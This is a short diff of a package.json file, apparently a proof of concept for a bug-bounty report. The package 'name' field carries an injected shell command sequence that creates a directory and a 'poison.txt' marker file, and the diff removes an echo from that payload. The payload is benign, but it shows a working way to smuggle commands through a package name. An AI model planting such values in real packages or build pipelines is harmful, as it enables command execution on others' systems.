@@ -1,5 +1,5 @@
 {
-  "name": "h1-poc; mkdir -p packages/h1-poc-verify/dist; echo "ssssssss"""; > packages/h1-poc-verify/dist/poison.txt; #",
+  "name": "h1-poc; mkdir -p packages/h1-poc-verify/dist; > packages/h1-poc-verify/dist/poison.txt; #",
   "private": true,
   "version": "1.0.0"
 }
